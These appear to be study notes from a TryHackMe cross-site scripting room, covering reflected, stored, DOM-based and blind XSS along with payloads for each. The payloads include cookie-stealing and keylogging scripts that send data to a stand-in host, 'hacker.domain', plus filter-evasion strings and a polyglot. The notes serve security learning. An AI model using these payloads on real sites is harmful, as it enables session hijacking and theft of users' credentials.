---
  title: "Cross Site Scripting"
---
# Intro

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.

# Payloads
In this phase we try to inject simple javascript code into the web application, to test various malicious payloads.

## Proof of Injection
Typically we start with an alert script.

```
<script>alert('XSS');</script>
```

## Session stealing
Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
```
<script>fetch('https://hacker.domain/steal?cookie=' + btoa(document.cookie));</script>
```
**Payload breakdown**
```fetch()``` command makes an HTTP request.

```{hacker.domain}``` is an attacker controlled domain that can catch http requests

```?cookie=``` is the query string that will contain the victim's cookies.

```btoa()``` command base64 encodes the victim's cookies.

```document.cookie``` accesses the victim's cookies for the target website


## Key Logger
The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

```
<script>document.onkeypress = function(e) { fetch('https://hacker.domain/log?key=' + btoa(e.key) );}</script>
```
## Business Logic
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called **user.changeEmail()**. Your payload could look like this:

```
<script>user.changeEmail('attacker@hacker.domain');</script>
```
# XSS Types

## Reflected XSS
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.
### Discovery
Test every possible point of entry, including
- Parameters in the URL Query String
- URL File path
- HTTP Headers
#### Escape input tag
```
"><sript>alert('TEST');</script>
```
#### Escape textarea tag
```
</textarea><script>alert('TEST');</script>
```
#### Escape javascript commands
```
';alert('TEST');//
```
#### Escape word filtering
Use variations of the word for example, 'script' can be altered to
- ScRIpT
- sscriptcrpt
#### Escape img tag that has character filters
```
image/path/jpg" onload="alert('TEST');
```
#### Polyglots
```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('TEST') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('TEST')//>\x3e```
## Stored XSS
In this type of vulnerability the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
### Discovery
You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to, including
- Comments on a blog
- User profile information
- Web site listings
## DOM Based XSS
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:
![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png)
This type of vulnerability usually occurs when the website JS code acts on **input** or **user interaction**.
### Discovery
You will need to look at specific variables in the source code and investigate if you have control over them, for example **window.location.x** . Then you will need to check if the values of these variables are written to the web page's DOM or passed to unsafe javascript methods such as eval().
## Blind XSS
Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
### Discovery
When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
Tool worth checking, xsshunter.
# Resources
https://tryhackme.com/room/xssgi
